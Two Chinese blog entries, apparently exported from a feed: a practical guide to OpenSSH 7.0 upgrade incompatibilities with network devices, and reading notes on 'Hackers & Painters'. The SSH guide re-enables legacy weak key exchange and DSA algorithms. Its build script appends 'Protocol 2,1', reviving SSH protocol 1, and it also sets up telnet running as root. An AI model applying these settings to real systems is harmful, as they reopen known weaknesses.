<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>某系统按照安全管理要求，需对全系统主机的OpenSSH版本升级。<br>第一次测试：系统自有服务器。主机：RedHat Linux ／SunOS：系统内全部主机升级，内部互通没有问题<br>第二次测试：主机到网络设备SSH互通性</p>
<h4 id="国外厂商"><a href="#国外厂商" class="headerlink" title="国外厂商"></a>国外厂商</h4><p>思科（系统版本IOS 12.0系列，IOS 4.0系列），RedBack（系统版本SEOS-12系列，SEOS-6.0系列）。<br>目前仅支持diffie-hellman-group1-sha1、ssh-dss两种算法。<br>当然不排除今年国产化运动影响，国外厂商维保过期等原因导致的售后升级服务滞后。</p>
<h4 id="国内厂商"><a href="#国内厂商" class="headerlink" title="国内厂商"></a>国内厂商</h4><p>华为，无论是城域骨干网设备，还是IPRAN 各型号，甚至老式交换机都完全兼容。<br>中兴，只有较新的CTN9000-E V3.00.10系列能有限支持diffie-hellman-group1-sha1，<br>其它各型号在服务器OpenSSH7.0以上版本后都无法正常访问。</p>
<h3 id="原因解析"><a href="#原因解析" class="headerlink" title="原因解析"></a>原因解析</h3><h4 id="直接原因：OpenSSH7-0安全特性升级"><a href="#直接原因：OpenSSH7-0安全特性升级" class="headerlink" title="直接原因：OpenSSH7.0安全特性升级"></a>直接原因：OpenSSH7.0安全特性升级</h4><p>基于安全考虑，OpenSSH7.0将diffie-hellman-group1-sha1，ssh-dss等运行时状态默认变更为禁用。<br>Support for the 1024-bit diffie-hellman-group1-sha1 key exchange is disabled by default at run-time.<br>Support for ssh-dss, ssh-dss-cert-<em> host and user keys is disabled by default at run-time</em></p>
<h4 id="采购原因：国产化运动"><a href="#采购原因：国产化运动" class="headerlink" title="采购原因：国产化运动"></a>采购原因：国产化运动</h4><p>国产化是近年以来的国家战略，各行各业都有涉及。在本次案例中，国际大厂Cicso,RedBack,Juniper等，个人以为更大的可能不是无法更新，而是基于商务原因。既然你不在维保合同期之内，又没有继续采购的计划，那我干嘛还给你升级？<br>甚至由此可以推论：针对在网国外厂商设备，漏洞多又没有升级保障，会变成攻击和防护的重灾区。</p>
<h4 id="软件质量：厂商系统架构水平差异"><a href="#软件质量：厂商系统架构水平差异" class="headerlink" title="软件质量：厂商系统架构水平差异"></a>软件质量：厂商系统架构水平差异</h4><p>同样是国内厂家，测试对比结果却非常强烈！！这其实是没有想到的。通过这个小细节，可以看出华为的系统架构与中兴早已拉开境界上的差距。结合近年来，华为出入开源社区的身影，更可以说明其对系统内核的理解和掌握已经到了相当的程度。<br>个人揣测，其早期版本可能也没有多好的支持。由于架构设计较好，又有更高的自我要求，逐步通过补丁升级，不动声色地就更新好了。持续升级能力，可以作为评价企业长期</p>
<h3 id="OpenSSH7-0以后的演进"><a href="#OpenSSH7-0以后的演进" class="headerlink" title="OpenSSH7.0以后的演进"></a>OpenSSH7.0以后的演进</h3><p>针对密钥强度和加密算法方面更新会持续加强，必须有所准备<br>We plan on retiring more legacy cryptography in the next releaseincluding:</p>
<ul>
<li>Refusing all RSA keys smaller than 1024 bits (the current minimumis 768 bits)</li>
<li>Several ciphers will be disabled by default: blowfish-cbc,cast128-cbc, all arcfour variants and the rijndael-cbc aliasesfor AES.</li>
<li>MD5-based HMAC algorithms will be disabled by default.</li>
</ul>
<h4 id="延伸：Logjam-Attack"><a href="#延伸：Logjam-Attack" class="headerlink" title="延伸：Logjam Attack"></a>延伸：Logjam Attack</h4><p>（本人没查到对应的中文名称，暂翻译为“僵尸攻击”，欢迎指正）<br>一种针对Diffie-Hellman密钥交换技术发起的攻击，而这项技术应用于诸多流行的加密协议，比如HTTPS、TLS、SMTPS、SSH及其他协议。一个国外计算机科学家团队2015-5-20公开发布。</p>
<h4 id="延伸：开源组件演进追踪"><a href="#延伸：开源组件演进追踪" class="headerlink" title="延伸：开源组件演进追踪"></a>延伸：开源组件演进追踪</h4><p>本案例实际操作过程中，开头走了很多弯路，并没有一下找到要害。<br>根源在于团队缺乏关注开源产品演进方向的意识和习惯，也缺乏直接阅读、理解官方文档的习惯。</p>
<h3 id="OpenSSH-7-0-变更说明"><a href="#OpenSSH-7-0-变更说明" class="headerlink" title="OpenSSH 7.0 变更说明"></a>OpenSSH 7.0 变更说明</h3><h1 id="Changes-since-OpenSSH-6-9"><a href="#Changes-since-OpenSSH-6-9" class="headerlink" title="Changes since OpenSSH 6.9"></a>Changes since OpenSSH 6.9</h1><p>This focus of this release is primarily to deprecate weak, legacyand/or unsafe cryptography.<br>Security————</p>
<ul>
<li><p>sshd(8): OpenSSH 6.8 and 6.9 incorrectly set TTYs to be world-<br>writable. Local attackers may be able to write arbitrary messages<br>to logged-in users, including terminal escape sequences.<br>Reported by Nikolay Edigaryev.</p>
</li>
<li><p>sshd(8): Portable OpenSSH only: Fixed a privilege separation<br>weakness related to PAM support. Attackers who could successfully<br>compromise the pre-authentication process for remote code<br>execution and who had valid credentials on the host could<br>impersonate other users.  Reported by Moritz Jodeit.</p>
</li>
<li><p>sshd(8): Portable OpenSSH only: Fixed a use-after-free bug<br>related to PAM support that was reachable by attackers who could<br>compromise the pre-authentication process for remote code<br>execution. Also reported by Moritz Jodeit.</p>
</li>
<li><p>sshd(8): fix circumvention of MaxAuthTries using keyboard-<br>interactive authentication. By specifying a long, repeating<br>keyboard-interactive “devices” string, an attacker could request<br>the same authentication method be tried thousands of times in<br>a single pass. The LoginGraceTime timeout in sshd(8) and any<br>authentication failure delays implemented by the authentication<br>mechanism itself were still applied.</p>
</li>
</ul>
<p>Found by Kingcope.</p>
<h2 id="Potentially-incompatible-Changes"><a href="#Potentially-incompatible-Changes" class="headerlink" title="Potentially-incompatible Changes"></a>Potentially-incompatible Changes</h2><ul>
<li>Support for the legacy SSH version 1 protocol is disabled by<br>default at compile time.</li>
<li>Support for the 1024-bit diffie-hellman-group1-sha1 key exchange<br>is disabled by default at run-time. It may be re-enabled using<br>the instructions at<a href="http://www.openssh.com/legacy.html">http://www.openssh.com/legacy.html</a></li>
<li>Support for ssh-dss, ssh-dss-cert-* host and user keys is disabled<br>by default at run-time. These may be re-enabled using the<br>instructions at <a href="http://www.openssh.com/legacy.html">http://www.openssh.com/legacy.html</a></li>
<li>Support for the legacy v00 cert format has been removed.</li>
<li>The default for the sshd_config(5) PermitRootLogin option has changed from “yes” to “prohibit-password”.</li>
<li>PermitRootLogin=without-password/prohibit-password now bans all<br>interactive authentication methods, allowing only public-key,hostbased and GSSAPI authentication (previously it permitted keyboard-interactive and password-less authentication if those were enabled).</li>
</ul>
<h4 id="解决方案（翻译）"><a href="#解决方案（翻译）" class="headerlink" title="解决方案（翻译）"></a>解决方案（翻译）</h4><p>OpenSSH实现了所有符合SSH标准的加密算法，使得应用之间可以互相兼容，但是自从一些老式的算法被发现不够强壮以来，并不是所有的算法都会默认启用。<br>当OpenSSH拒绝连接一个只支持老式算法的应用时，我们该如何做呢？<br>当一个SSH客户端与一个服务端建立连接的时候，两边会互相交换连接参数清单。清单包括用于加密连接的编码信息，消息认证码（MAC）用于防止网络嗅探篡改，<br>公钥算法可以让服务端向客户端证明它是李刚（我就是我，而不是另一个“我”），密钥交换算法是用来生成每次连接的密钥。在一次成功的连接中，这里的每个参数必须有一组互相支持的选择。<br>当客户端和服务端通讯的时候，不能匹配到一组互相支持的参数配置，那么这个连接将会失败。<br>OpenSSH(7.0及以上版本）将输出一个类似的错误信息：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Unable to negotiate with 127.0.0.1: no matching key exchange method found.</span><br><span class="line">Their offer: diffie-hellman-group1-sha1</span><br></pre></td></tr></table></figure><br>在这种情况下，客户端和服务端不能够就密钥交换算法达成一致。服务端只提供了一个单一的算法 ：diffie-hellman-group1-sha1。<br>OpenSSH可以支持这种算法，但是它默认不启用，因为这个算法非常弱，理论上存在僵尸攻击的风险。<br>这个问题的最好的解决方案是升级软件。</p>
<p>OpenSSH 禁用的算法，都是那些我们明确不推荐使用的，因为众所周知它们是不安全的。在某些情况下，立科升级也许是不可能的，你可能需要临时地重新启用这个较弱的算法以保持访问。在上面这种错误信息的情况下，OpenSSH 可以配置启用 diffie-hellman-group1-sha1 密钥交换算法（或者任何其它被默认禁用的），可通过KexAlgorithm选项－或者在命令行：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@127.0.0.1</span><br></pre></td></tr></table></figure><br>或者在 ~/.ssh/config (/etc/ssh/ssh_config) 配置文件中:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host somehost.example.org</span><br><span class="line">KexAlgorithms +diffie-hellman-group1-sha1</span><br></pre></td></tr></table></figure></p>
<p>命令行中ssh和“＋”号之间连接算法选项的配置，对客户端默认设置来说相当于替换。通过附加信息，你可以自动升级到最佳支持算法，当服务端开始支持它的时候。另一个例子，主机验证过程中，当客户端和服务端未能就公钥算法达成一致的时候：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Unable to negotiate with 127.0.0.1: no matching host key type found.</span><br><span class="line">Their offer: ssh-dss</span><br></pre></td></tr></table></figure>
<p>OpenSSH 7.0 及以上版本同样禁用了 ssh-css(DSA)公钥交换算法。<br>它也太弱了，我们强烈不建议使用它。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss user@127.0.0.1</span><br></pre></td></tr></table></figure><br>或者在 ~/.ssh/config 配置文件中:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host somehost.example.org</span><br><span class="line">HostkeyAlgorithms ssh-dss</span><br></pre></td></tr></table></figure><br>视服务端配置情况而定，验证过程中其它连接参数也可能失败。<br>你启用它们的时候，也许需要确定编码方式或者消息验证码配置选项。<br>延伸：查询 SSH 已支持的算法<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -Q cipher       # 支持的编码方式</span><br><span class="line">ssh -Q mac          # 支持的消息验证码</span><br><span class="line">ssh -Q key          # 支持的公钥类型</span><br><span class="line">ssh -Q kex          # 支持的密钥交换算法</span><br></pre></td></tr></table></figure><br>最后，当你需要试图连接一个特殊主机的时候，也可以通过－G选项查询实际使用ssh配置。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -G  user@somehost.example.com</span><br></pre></td></tr></table></figure><br>将列出所有的配置选项，包括被选用的编码方式，消息验证码，公钥算法，密钥算法参数的值。</p>
<h2 id="客户端降级兼容"><a href="#客户端降级兼容" class="headerlink" title="客户端降级兼容"></a>客户端降级兼容</h2><h4 id="Invalid-key-length"><a href="#Invalid-key-length" class="headerlink" title="Invalid key length"></a>Invalid key length</h4><blockquote>
<p>client:OpenSSH_7.6p1, OpenSSL 1.1.0h-fips  27 Mar 2018<br>server:cisco switch<br>error: ssh_dispatch_run_fatal: Connection to 192.168.1.11 port 22: Invalid key length</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host *</span><br><span class="line">	KexAlgorithms diffie-hellman-group1-sha1</span><br><span class="line">	Ciphers aes128-cbc</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ~/.ssh/ssh_config</span></span><br><span class="line">Host myserver</span><br><span class="line">	Hostname mydomain.com</span><br><span class="line">	User myusername</span><br><span class="line">	Port 10022</span><br><span class="line">  Ciphers aes128-cbc</span><br><span class="line">  MACs hmac-sha1</span><br><span class="line">  KexAlgorithms diffie-hellman-group1-sha1</span><br><span class="line"></span><br><span class="line">Host *</span><br><span class="line">	Protocol 2</span><br><span class="line">	HostKeyAlgorithms ssh-rsa</span><br><span class="line">	Ciphers aes256-ctr</span><br><span class="line">	MACs hmac-sha2-512</span><br><span class="line">	KexAlgorithms diffie-hellman-group-exchange-sha256</span><br><span class="line">	IdentityFile ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<h2 id="服务端安全性增强"><a href="#服务端安全性增强" class="headerlink" title="服务端安全性增强"></a>服务端安全性增强</h2><h4 id="RSA-modulus-too-small"><a href="#RSA-modulus-too-small" class="headerlink" title="RSA modulus too small"></a>RSA modulus too small</h4><p>现象：ssh 客户端提示 RSA modulus too small<br>解决方案：增强服务端密钥长度</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$ ssh user@192.<span class="number">168.3</span>.<span class="number">1</span></span><br><span class="line">ssh_rsa_verify: RSA modulus too small:</span><br><span class="line"> <span class="number">512</span> &lt; minimum <span class="number">768</span> bits</span><br><span class="line">key_verify failed <span class="keyword">for</span> server_host_key</span><br></pre></td></tr></table></figure>
<ul>
<li><p>思科路由器 <strong>crypto key generate rsa</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cisco(config)#crypto key zeroize rsa</span><br><span class="line"> % All RSA keys will be removed.</span><br><span class="line"> % All router certs issued using these keys will also be removed.</span><br><span class="line"> Do you really want to remove these keys? [yes/no]: yes</span><br><span class="line"></span><br><span class="line"> cisco7200(config)#crypto key generate rsa</span><br><span class="line"> The name for the keys will be: liyi-cisco7200.liyi.liyi.com</span><br><span class="line"> Choose the size of the key modulus in the range of 360 to 2048 for your</span><br><span class="line">   General Purpose Keys. Choosing a key modulus greater than 512 may take</span><br><span class="line">   a few minutes.</span><br><span class="line"></span><br><span class="line"> How many bits in the modulus [512]: 1024</span><br><span class="line"> % Generating 1024 bit RSA keys ...[OK]</span><br></pre></td></tr></table></figure>
</li>
<li><p>华为路由器 <strong>rsa local-key-pair create</strong></p>
</li>
</ul>
<p>如果RSA密钥已经存在，将提示用户确认是否替换原有密钥。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ system-view <span class="comment">#进入系统视图</span></span><br><span class="line">[HUAWEI]rsa local-key-pair create</span><br><span class="line">The key name will be: HUAWEI_Host                                               </span><br><span class="line">% RSA keys defined <span class="keyword">for</span> HUAWEI_Host already exist.                               </span><br><span class="line">Confirm to replace them? [Y/N]:y                                                </span><br><span class="line">The range of public key size is (512 ~ 2048).                                   </span><br><span class="line">NOTES: If the key modulus is greater than 512,                                  </span><br><span class="line">       It will take a few minutes.                                              </span><br><span class="line">Input the bits <span class="keyword">in</span> the modulus[default = 512]:1024                               </span><br><span class="line">Generating keys...                      </span><br></pre></td></tr></table></figure>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h4><ul>
<li>安装</li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$ yum install telnet telnet-server</span><br></pre></td></tr></table></figure>
<ul>
<li>启动服务</li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$ vi /etc/xinetd.d/telnet</span><br><span class="line">service telnet</span><br><span class="line">&#123;</span><br><span class="line">        flags           = REUSE</span><br><span class="line">        socket_type     = stream</span><br><span class="line">        <span class="keyword">wait</span>            = <span class="keyword">no</span></span><br><span class="line">        user            = root</span><br><span class="line">        server          = <span class="regexp">/usr/s</span>bin/in.telnetd</span><br><span class="line">        log_on_failure  += USERID</span><br><span class="line">        disable         = yes <span class="comment">##默认值 no     </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ service xinetd start</span><br><span class="line">$ /etc/init.d/xinetd start</span><br></pre></td></tr></table></figure>
<ul>
<li>验证服务状态</li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$ less /etc/services | <span class="keyword">grep</span> telnet</span><br><span class="line">telnet  <span class="number">23</span>/tcp</span><br><span class="line">telnet  <span class="number">23</span>/udp</span><br></pre></td></tr></table></figure>
<ul>
<li>Upgrade OpenSSL &amp; OpenSSH</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### Upgrade OpenSSL #######</span></span><br><span class="line">tar -xvf openssl*.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openssl*</span><br><span class="line">./config shared</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="built_in">export</span> INSTALL_SSL_DATE=`date +%Y%m%d`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INSTALL_SSL_DATE</span></span><br><span class="line">mv /usr/bin/openssl /usr/bin/openssl_<span class="variable">$INSTALL_SSL_DATE</span></span><br><span class="line">mv /usr/include/openssl/ /usr/include/openssl_<span class="variable">$INSTALL_SSL_DATE</span></span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/ssl/bin/openssl /usr/bin/openssl</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/ssl/include/openssl /usr/include/openssl</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/usr/local/ssl/lib&quot;</span> &gt;&gt; /etc/ld.so.conf</span><br><span class="line">ldconfig -v</span><br><span class="line"></span><br><span class="line"><span class="comment">#### Upgrade OpenSSH #######</span></span><br><span class="line"></span><br><span class="line">tar -xvf openssh*7.7.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openssh*</span><br><span class="line">./configure --with-ssl-dir=/usr/<span class="built_in">local</span>/ssl --with-md5-passwords</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> INSTALL_SSL_DATE=`date +%Y%m%d`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INSTALL_SSL_DATE</span></span><br><span class="line">mv /etc/ssh /etc/ssh_<span class="variable">$INSTALL_SSL_DATE</span></span><br><span class="line">mv /usr/bin/ssh /usr/bin/ssh_<span class="variable">$INSTALL_SSL_DATE</span></span><br><span class="line">mv /usr/sbin/sshd /usr/sbin/sshd_<span class="variable">$INSTALL_SSL_DATE</span></span><br><span class="line"></span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/ssh /usr/bin/ssh</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/sbin/sshd /usr/sbin/sshd</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Protocol 2,1&quot;</span> &gt;&gt; /usr/<span class="built_in">local</span>/etc/ssh_config</span><br><span class="line">chmod 755 /slview/.ssh</span><br><span class="line">chmod 600 /slview/.ssh/authorized_keys</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/etc /etc/ssh</span><br><span class="line">service sshd restart</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-service running!!!!&quot;</span></span><br><span class="line">ssh -V</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Cyber-Security-Master》"><a href="#《The-Cyber-Security-Master》" class="headerlink" title="《The Cyber-Security Master》"></a><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.shaobin.wang/post/6.html">SSH登录旧设备的常见问题及解决方案</a></li>
<li><a href="https://www.cnblogs.com/kevingrace/p/6110842.html">Linux系统下的ssh使用(依据个人经验总结)</a></li>
<li><a href="https://smallstep.com/blog/everything-pki.html">Everything you should know about certificates and PKI but are too afraid to ask</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/24552307">赵亚：令人作呕的OpenSSL</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber-Security:黑客与技术、产业及其精神世界</title>
    <url>/2017/05/09/CyberSecurity-Hacker/</url>
    <content><![CDATA[<blockquote>
<p>理解计算机的关键，则是要理解计算机背后的人。表面上这是一个机器的时代，但是实际上机器的社记者决定了我们的时代。</p>
</blockquote>
<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>读书笔记|《黑客与画家》</li>
</ul>
<span id="more"></span>
<p><a href="http://paulgraham.com/books.html">《黑客与画家》（Hackers &amp; Painters）</a> 的内容来自 Paul Graham 的博客，该文集主要讨论编程语言、黑客工作方法以及作者对于教育、版权制度和创业精神等方面的观点。书中的内容不但有助于了解计算机编程的历史、互联网行业规则，还有助于读者了解我们这个时代，走进 Hacker 的精神世界。</p>
<p><strong>黑客（hacker）</strong>：解释一，最优秀的程序员；解释二，入侵计算机的人。本书特指第一种人。</p>
<ul>
<li><p><a href="http://paulgraham.com">原作者：Paul Graham （保罗·格雷厄姆）</a><br>美国著名程序员、风险投资家、技术作家。Paul Graham 以 Lisp 方面的工作而知名，也是最早的Web应用Viaweb的创办者之一，后来以近5千万美元价格被雅虎收购，成为Yahoo! Store。他拥有哈佛大学应用科学（计算机方向）博士学位，担任麻省理工学院副教授，并且在罗德岛设计学院和佛罗伦萨绘画艺术学院学习过绘画。</p>
</li>
<li><p><a href="http://www.ruanyifeng.com/blog">翻译者：阮一峰</a><br>阮一峰也是一位神人，是国内知名的 IT 技术专家。10 余年来发表了海量的网络文章，内容包含读书、经济学、历史、IT技术、医学、电影、音乐和美术、政治学、科学、创业、互联网等等等，我知道的好像他都知道。无论是否从事 IT 职业，阅读他的博客相信都会受益良多。</p>
</li>
</ul>
<h2 id="怎么理解编程语言？"><a href="#怎么理解编程语言？" class="headerlink" title="怎么理解编程语言？"></a>怎么理解编程语言？</h2><blockquote>
<p>程序员非常 <strong>忠于</strong> 他们心爱的语言。编程语言与其说它是技术，还不如说是程序员的思考模式。编程语言是技术和宗教的混合物。（p178）</p>
</blockquote>
<p>在不考虑其他因素的情况下，总的来看，对于应用程序来说，<strong>选择总体上最强大、效率也在可接受范围内的编程语言</strong>。</p>
<p>如果从 <strong>图灵等价（Turing-equivalent）</strong> 的角度看来看，所有语言都是一样强大的，但是这对程序员没有意义。关于强大很难正式定义，有一个解释方法是一些功能在一种语言是内置的，但是在另一种语言中需要修改解释器才能做到，那么前者就比后者更强大。</p>
<p>如果A语言有一个运算符可以移除字符串中的空格，而B语言没有这个运算符，这种情况则不足以称A语言比B语言强大，因为你可以在B语言里写一个函数实现这个功能。但是A语言支持某种高级功能（假定是递归），而B语言不支持，你就不可能通过自己编写函数库解决了，这就代表A语言比B语言更强大。</p>
<ul>
<li>例外情况：<br>1）如果在开发的程序必须与另一个程序紧密配合，那么可能最好还是使用后者的开发语言。<br>2）如果程序只是要做一些很简单的事（比如整数运算或位操作），那就不妨使用一种比较靠近机器的低层次语言，这样运行起来会更快一些。<br>3）如果程序只是为了特定场合一次性使用，那么你最好根据自己需要解决的问题选择具有强大函数库的语言。</li>
</ul>
<h2 id="论编程方法"><a href="#论编程方法" class="headerlink" title="论编程方法"></a>论编程方法</h2><blockquote>
<p>应用软件运行速度提升的关键在于有一个好的性能分析器(profiler)帮助指导程序开发。(p165 )</p>
<p>书上说，调试（debugging）是最后的步骤，用来纠正打字的错误和疏忽。可是我的工作方法看上去却像编程就是在调试。编程语言是用来帮助思考程序的，而不是用来表达你已经想好的程序。它应该是一支铅笔，而不是一支钢笔。(p22)</p>
<p>评价一种语言的优劣不能简单地看最后的程序是否表达得很漂亮，而要看程序从无到有的那条完成路径是否很漂亮。（p215）</p>
</blockquote>
<p>源代码应该可以自己解释自己。</p>
<blockquote>
<p>程序写出来是给人看的，附带能在机器上运行。—— 《计算机程序的结构与解释》</p>
<p>不要把编程语言看成那些已完成的程序的表达方式，而应该把它理解成促进程序从无到有的一种媒介。这里的意思是说，成品的材料和开发时用的材料其实是不一样的。搞艺术的人都知道，这两个阶段往往需要不同的媒介。比如，大理石是一种非常良好、耐用的材料，很适合用于最后的成品，但是它极其缺乏弹性和灵活性，所以不适合在构思阶段用来做模型。（p215）</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Paul-Graham-Pic.png" alt="Paul Graham 的个人博客 http://paulgraham.com 截图。图中两人是 斯蒂夫·乔布斯(Steves Jobs) 和 斯蒂芬·盖瑞·沃兹尼亚克（Stephen Gary Wozniak），他们合伙创立苹果公司。"></p>
<h2 id="论思想自由"><a href="#论思想自由" class="headerlink" title="论思想自由"></a>论思想自由</h2><p>Paul Graham 在《黑客与画家》一书中，始终强调思想自由对人才、对技术进步和公众利益的极端重要性。例如：</p>
<blockquote>
<p>如果别人告诉你该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。（p35）</p>
<p>流行的思想观点与流行的服饰产生方式不尽相同，但是，它们的传播路径却很相似。第一批的接受者总是带有很强的抱负心，他们有自觉的精英意识，想把自己与普通人区分开来。当流行趋势确立以后，第二批接受者就加入进来了，人数比上一批庞大得多，恐惧心在背后驱使着他们。他们接受流行，不是因为想要与众不同，而是因为害怕与众不同。（p43）</p>
</blockquote>
<hr>

<blockquote>
<p>只有保持一定的距离才能观察到人们观念的变化，发现流行（也就是人们自以为是正确的事情）到底是什么。如果你想要清晰地思考，就必须远离人群。（p50）</p>
<p><strong>想要做出优秀作品，你需要一个什么问题都能思考的大脑。</strong> 尤其是那些不应该思考的问题，你的大脑也要养成思考它们的习惯。优秀作品往往来自于其他人忽视的想法，而最被忽视的想法就是那些禁止的思想观点。</p>
</blockquote>
<hr>

<blockquote>
<p>智力越高的人，越愿意去思考那些惊世骇俗的思想观点。这不仅仅因为聪明人本身很积极地寻找传统观念的漏洞，还因为传统观念对他们的束缚力很小，很容易摆脱。从他们的衣着上就可以看出这一点：不受传统观念束缚的人，往往也不会穿流行的衣服。</p>
<p>做一个异端是有回报的，不仅是在科学领域，在任何有竞争的地方，只要你能看到别人看不到或不敢看的东西，你就有很大的优势。（p45）</p>
</blockquote>
<hr>

<blockquote>
<p>如果你能“远远地”跳出传统思维，提出让别人一听就脑袋轰一声炸开的惊人观点，那么你就在“小小地”跳出传统思维方面不会有任何困难。要知道，人们把后面的这种情况称为“创新”。(p46)</p>
</blockquote>
<p>在思想自由和言论自由的关系上，Paul Graham 大声疾呼：<strong>自由思考比畅所欲言更重要！</strong>。</p>
<blockquote>
<p>如果你感到一定要跟那些人辩个明白，绝不咽下这口气，一定要把话说清楚，结果很可能是从此你再也无法自由理性地思考了。我认为这样做不可取，更好的方法是<strong>在思想和言论之间画一条明确的界限</strong>。在心理无所不想，但是不一定要说出来。你的思想是一个地下组织，绝不要把那里发生的时期一股脑说给外人听。（p47）</p>
</blockquote>
<hr>

<blockquote>
<p>“守口如瓶”的真正缺点在于，你从此无法享受讨论带来好处了。讨论一个观点会产生更多的观点，不讨论就什么观点也没有。</p>
</blockquote>
<hr>

<blockquote>
<p>找一些信得过的知己，只与他们畅所欲言、无所不谈。这样不仅可以获得新观点，还可以用来选择朋友。能够一起谈论“异端邪说” 并且不会因此气急败坏的人，就是你最应该认识的朋友。</p>
</blockquote>
<h2 id="论知识产权"><a href="#论知识产权" class="headerlink" title="论知识产权"></a>论知识产权</h2><p>关于知识产权制度，从诞生的那一天起实际上就存在支持/反对两大阵营。黑客大多坚定地站在反对派阵营，或者说黑客群体是反对知识产权制度中最重要的一支力量。</p>
<p>首先，对于美国而言，其知识产权制度拥有 200 多年的历史，拥有强大的知识产权保护体系。</p>
<blockquote>
<p>国会应有权……促进科学和实用艺术的进步，确保有限时报作者和发明者的独家权利，以及他们各自的著作和发现….. 美国宪法第一章第8款</p>
</blockquote>
<ul>
<li>1789 年《宪法》第一章第 8 款</li>
<li>1790年4月10日，美国第一部版权法。保护范围：图书、地图和图表，之后扩展到摄影、录音和电影。（大清国乾隆五十五年，同年本杰明·富兰克林&amp;亚当·斯密逝世）</li>
<li>1909年版权法案。未经授权的复制的定义必须是从视觉上可以看到或阅读的一种形式（音乐卷片、ROM芯片上下象棋的游戏等都不在保护之列）。</li>
<li>1976年和1980年，版权法修改，使之涵盖了计算机软件。</li>
</ul>
